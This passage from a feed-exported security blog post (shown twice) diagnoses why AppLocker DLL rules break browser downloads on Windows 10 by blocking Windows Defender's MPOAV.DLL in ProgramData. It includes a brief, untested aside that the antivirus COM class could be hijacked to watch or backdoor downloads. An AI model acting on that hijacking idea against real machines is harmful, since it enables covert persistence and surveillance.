src=\"https://1.bp.blogspot.com/-NaY3DF2Xdbg/Xem6WjDKPUI/AAAAAAAAECY/LXcgxoJQ_x0DoSRLe0ay5gstw6-UWymIwCLcBGAsYHQ/s640/applocker_error_2.PNG\" title=\"\" width=\"640\" /></a></div><br />Oddly it worked if I turned off DLL Rule Enforcement, but not when I enabled it again. My immediate thought might be the virus checking was trying to map the executable and somehow it was hitting the DLL verification callback and failing as the file was in my Downloads folder which is not in the default rule set. That seemed pretty unlikely, however clearly something was being blocked from running. Fortunately <i>AppLocker</i> maintains an Audit Log under <i>\"Applications and Services Logs -&gt; Microsoft -&gt; Windows -&gt; AppLocker -&gt; EXE and DLL\" </i>so we can quickly diagnose the failure.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-AAQTyEWk5uU/Xem8dxu9HvI/AAAAAAAAECk/v8jTgpOlTrwEuDT5NYxj_qHXHmmgaRbqgCLcBGAsYHQ/s1600/applocker_audit.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Failing DLL load in audit log showing it tried to load %OSDRIVE%\\PROGRAMDATA\\MICROSOFT\\WINDOWS DEFENDER\\PLATFORM\\4.18.1910.4-0\\MPOAV.DLL\" border=\"0\" height=\"244\" src=\"https://1.bp.blogspot.com/-AAQTyEWk5uU/Xem8dxu9HvI/AAAAAAAAECk/v8jTgpOlTrwEuDT5NYxj_qHXHmmgaRbqgCLcBGAsYHQ/s640/applocker_audit.PNG\" title=\"\" width=\"640\" /></a></div><br />The failing DLL load was for <i>\"%OSDRIVE%\\PROGRAMDATA\\MICROSOFT\\WINDOWS DEFENDER\\PLATFORM\\4.18.1910.4-0\\MPOAV.DLL\"</i>. This makes sense, the default rules only permit <i>%WINDOWS%</i> and <i>%PROGRAMFILES%</i> for normal users, however <i>%OSDRIVE%\\ProgramData</i> is not allowed. This is intentional as you don't want to grant access to locations a normal user could write to, so generally allowing all of <i>%ProgramData%</i> would be asking for trouble. [update:20191206] of course this is known about (I'm not suggesting otherwise), <a href=\"https://github.com/microsoft/AaronLocker\">AaronLocker</a> should allow this <a href=\"https://twitter.com/AaronMargosis/status/1203005179106414592\">DLL by default</a>.<br /><br />I thought it'd at least be interesting to see why it fails and what MPOAV is doing. As the same failure occurred in both Edge (I didn't test IE) and Chrome it was clearly some common API they were calling. As Chrome is open source it made more sense to look there. Tracking down the resource string for the error lead me to <a href=\"https://chromium.googlesource.com/chromium/src/+/6ab174bd663c2e6ef4e620eee1af40c6adcfa399/components/download/quarantine/quarantine_win.cc#129\">this code</a>. The code was using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iattachmentexecute\">Attachment Services API</a>. Which is a common interface to verify downloaded files and attachments, apply MOTW and check for viruses.<br /><br />When the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nf-shobjidl_core-iattachmentexecute-save\">IAttachmentExecute::Save</a>&nbsp;method is called the file is checked for viruses using the currently registered anti-virus COM object which implements the <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537369(v%3Dvs.85)\">IOfficeAntiVirus</a> interface. The implementation for that COM class is in MPOAV.DLL, which as we saw is blocked so the COM object creation fails. And a failure to create the object causes the <i>Save</i> method to fail and the <i>Attachment Services</i> code to automatically delete the file so the browser can't even do anything about it such as ask the user. Ultra rude!<br /><br />You might wonder how is this COM class is registered? An implementor needs to register their COM object with a Category ID of <i>\"{56FFCC30-D398-11d0-B2AE-00A0C908FA49}\"</i>. If you have <a href=\"https://www.powershellgallery.com/packages/OleViewDotNet/1.9\">OleViewDotNet</a> setup (note there are other tools) you can dump all registered classes using the following <i>PowerShell</i> command:<br /><br /><span>Get-ComCategory -CatId '56FFCC30-D398-11d0-B2AE-00A0C908FA49' | Select -ExpandProperty ClassEntries</span><br /><br />On a default installation of Windows 10 you should find a single class, <i>\"Windows Defender IOfficeAntiVirus implementation\"</i> registered which is implemented in the MPOAV DLL. We can try and create the class with DLL enforcement to convince ourselves that's the problem:<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-WRbFg5qKZQI/XenEEJpDtoI/AAAAAAAAECw/Mv8kbvPn6bQm4WN_Hh65A5y_mJkq_NUUACLcBGAsYHQ/s1600/oav_failure.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"PowerShell error when creating MSOAV COM object. Fails with AppLocker policy block error.\" border=\"0\" height=\"190\" src=\"https://1.bp.blogspot.com/-WRbFg5qKZQI/XenEEJpDtoI/AAAAAAAAECw/Mv8kbvPn6bQm4WN_Hh65A5y_mJkq_NUUACLcBGAsYHQ/s640/oav_failure.PNG\" title=\"\" width=\"640\" /></a></div><br />No doubt this has been documented before (<strike>and I've not looked</strike>&nbsp;[update:20191206] of course <a href=\"https://twitter.com/Hexacorn\">Hexacorn</a> <a href=\"http://www.hexacorn.com/blog/2018/08/04/beyond-good-ol-run-key-part-83/\">blogged about it</a>) but you could probably COM hijack this class (or register your own) and get notified of every executable downloaded by the user's web browser. Perhaps even backdoor everything. I've not tested that however ;-)<br /><br />This issue does demonstrate a common weakness with any application allow-listing solution. You've got to add a rule to allow this (probably undocumented) folder in your DLL rules. Or you could allow-list all Microsoft Defender certificates I suppose. Potentially both of these criteria could change and you end up having to fix random breakage which wouldn't be fun across a large fleet of machines. It also demonstrates a weird issue with attachment scanning, if your AV is somehow misconfigured things will break and there's no obvious reason why. Perhaps we need to move on from using outdated APIs to do this process or at least handle failure better."}], "summary": "On my VM (with a default Windows 10 1909) I used for my series of AppLocker I wanted to test out the new Edge.&nbsp; I opened the old Edge and tried to download the canary installer, however the download failed, Edge said the installer had a virus and it'd been deleted. How rude! I also tried the download in Chrome on the same machine with the same result, even ruder!<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-NaY3DF2Xdbg/Xem6WjDKPUI/AAAAAAAAECY/LXcgxoJQ_x0DoSRLe0ay5gstw6-UWymIwCLcBGAsYHQ/s1600/applocker_error_2.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Downloading Edge Canary in Edge with AppLocker. Shows a bar that the download has been deleted because it's a virus.\" border=\"0\" height=\"276\" src=\"https://1.bp.blogspot.com/-NaY3DF2Xdbg/Xem6WjDKPUI/AAAAAAAAECY/LXcgxoJQ_x0DoSRLe0ay5gstw6-UWymIwCLcBGAsYHQ/s640/applocker_error_2.PNG\" title=\"\" width=\"640\" /></a></div><br />Oddly it worked if I turned off DLL Rule Enforcement, but not when I enabled it again. My immediate thought might be the virus checking was trying to map the executable and somehow it was hitting the DLL verification callback and failing as the file was in my Downloads folder which is not in the default rule set. That seemed pretty unlikely, however clearly something was being blocked from running. Fortunately <i>AppLocker</i> maintains an Audit Log under <i>\"Applications and Services Logs -&gt; Microsoft -&gt; Windows -&gt; AppLocker -&gt; EXE and DLL\" </i>so we can quickly diagnose the failure.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-AAQTyEWk5uU/Xem8dxu9HvI/AAAAAAAAECk/v8jTgpOlTrwEuDT5NYxj_qHXHmmgaRbqgCLcBGAsYHQ/s1600/applocker_audit.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Failing DLL load in audit log showing it tried to load %OSDRIVE%\\PROGRAMDATA\\MICROSOFT\\WINDOWS DEFENDER\\PLATFORM\\4.18.1910.4-0\\MPOAV.DLL\" border=\"0\" height=\"244\" src=\"https://1.bp.blogspot.com/-AAQTyEWk5uU/Xem8dxu9HvI/AAAAAAAAECk/v8jTgpOlTrwEuDT5NYxj_qHXHmmgaRbqgCLcBGAsYHQ/s640/applocker_audit.PNG\" title=\"\" width=\"640\" /></a></div><br />The failing DLL load was for <i>\"%OSDRIVE%\\PROGRAMDATA\\MICROSOFT\\WINDOWS DEFENDER\\PLATFORM\\4.18.1910.4-0\\MPOAV.DLL\"</i>. This makes sense, the default rules only permit <i>%WINDOWS%</i> and <i>%PROGRAMFILES%</i> for normal users, however <i>%OSDRIVE%\\ProgramData</i> is not allowed. This is intentional as you don't want to grant access to locations a normal user could write to, so generally allowing all of <i>%ProgramData%</i> would be asking for trouble. [update:20191206] of course this is known about (I'm not suggesting otherwise), <a href=\"https://github.com/microsoft/AaronLocker\">AaronLocker</a> should allow this <a href=\"https://twitter.com/AaronMargosis/status/1203005179106414592\">DLL by default</a>.<br /><br />I thought it'd at least be interesting to see why it fails and what MPOAV is doing. As the same failure occurred in both Edge (I didn't test IE) and Chrome it was clearly some common API they were calling. As Chrome is open source it made more sense to look there. Tracking down the resource string for the error lead me to <a href=\"https://chromium.googlesource.com/chromium/src/+/6ab174bd663c2e6ef4e620eee1af40c6adcfa399/components/download/quarantine/quarantine_win.cc#129\">this code</a>. The code was using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iattachmentexecute\">Attachment Services API</a>. Which is a common interface to verify downloaded files and attachments, apply MOTW and check for viruses.<br /><br />When the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nf-shobjidl_core-iattachmentexecute-save\">IAttachmentExecute::Save</a>&nbsp;method is called the file is checked for viruses using the currently registered anti-virus COM object which implements the <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537369(v%3Dvs.85)\">IOfficeAntiVirus</a> interface. The implementation for that COM class is in MPOAV.DLL, which as we saw is blocked so the COM object creation fails. And a failure to create the object causes the <i>Save</i> method to fail and the <i>Attachment Services</i> code to automatically delete the file so the browser can't even do anything about it such as ask the user. Ultra rude!<br /><br />You might wonder how is this COM class is registered? An implementor needs to register their COM object with a Category ID of <i>\"{56FFCC30-D398-11d0-B2AE-00A0C908FA49}\"</i>. If you have <a href=\"https://www.powershellgallery.com/packages/OleViewDotNet/1.9\">OleViewDotNet</a> setup (note there are other tools) you can dump all registered classes using the following <i>PowerShell</i> command:<br /><br /><span>Get-ComCategory -CatId '56FFCC30-D398-11d0-B2AE-00A0C908FA49' | Select -ExpandProperty ClassEntries</span><br /><br />On a default installation of Windows 10 you should find a single class, <i>\"Windows Defender IOfficeAntiVirus implementation\"</i> registered which is implemented in the MPOAV DLL. We can try and create the class with DLL enforcement to convince ourselves that's the problem:<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-WRbFg5qKZQI/XenEEJpDtoI/AAAAAAAAECw/Mv8kbvPn6bQm4WN_Hh65A5y_mJkq_NUUACLcBGAsYHQ/s1600/oav_failure.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"PowerShell error when creating MSOAV COM object. Fails with AppLocker policy block error.\" border=\"0\" height=\"190\" src=\"https://1.bp.blogspot.com/-WRbFg5qKZQI/XenEEJpDtoI/AAAAAAAAECw/Mv8kbvPn6bQm4WN_Hh65A5y_mJkq_NUUACLcBGAsYHQ/s640/oav_failure.PNG\" title=\"\" width=\"640\" /></a></div><br />No doubt this has been documented before (<strike>and I've not looked</strike>&nbsp;[update:20191206] of course <a href=\"https://twitter.com/Hexacorn\">Hexacorn</a> <a href=\"http://www.hexacorn.com/blog/2018/08/04/beyond-good-ol-run-key-part-83/\">blogged about it</a>) but you could probably COM hijack this class (or register your own) and get notified of every executable downloaded by the user's web browser. Perhaps even backdoor everything. I've not tested that however ;-)<br /><br />This issue does demonstrate a common weakness with any application allow-listing solution. You've got to add a rule to allow this (probably undocumented) folder in your DLL rules. Or you could allow-list all Microsoft Defender certificates I suppose. Potentially both of these criteria could change and you end up having to fix random breakage which wouldn't be fun across a large fleet of machines. It also demonstrates a weird issue with attachment scanning, if your AV is somehow misconfigured things will break and there's no obvious reason why. Perhaps we need to move on from using outdated APIs to do this process or at least handle failure better.", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8882751517907619498"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8882751517907619498"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2019/12/the-mysterious-case-of-broken-virus.html", "title": "The Mysterious Case of a Broken Virus Scanner"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}, "media_thumbnail": [{"url": "https://1.bp.blogspot.com/-NaY3DF2Xdbg/Xem6WjDKPUI/AAAAAAAAECY/LXcgxoJQ_x0DoSRLe0ay5gstw6-UWymIwCLcBGAsYHQ/s72-c/applocker_error_2.PNG", "height": "72", "width": "72"}], "href": ""}]}